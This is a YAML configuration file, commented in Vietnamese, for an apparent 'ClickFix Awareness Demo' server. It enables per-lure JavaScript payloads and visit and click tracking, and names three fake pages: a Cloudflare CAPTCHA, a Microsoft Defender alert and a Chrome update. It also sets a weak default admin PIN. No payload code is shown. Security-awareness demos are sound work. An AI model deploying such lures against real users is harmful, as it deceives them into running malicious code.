# ClickFix Demo — Cấu hình chính
# Chỉnh sửa file này và gọi GET /api/reload để áp dụng mà không cần khởi động lại

app:
  name: "ClickFix Awareness Demo"
  version: "3.0.0"
  debug: false

server:
  host: "0.0.0.0"
  port: 8080

payload:
  enabled: true
  default_script: "default.js"
  per_lure: true

tracking:
  enabled: true
  log_visits: true
  log_clicks: true

lures:
  default: "cloudflare_captcha"
  auto_discover: true

admin:
  # Enable pin protection for /admin and stats endpoints
  auth_required: true
  # Default PIN to access dashboard (can be customized)
  pin: "123456"

# ────────────────────────────────────────────────────────────────
# 3 kịch bản ClickFix phổ biến nhất:
#   1. /verify         — Cloudflare CAPTCHA giả
#   2. /security-alert — Microsoft Defender Alert giả
#   3. /update-required — Chrome Update giả
# ────────────────────────────────────────────────────────────────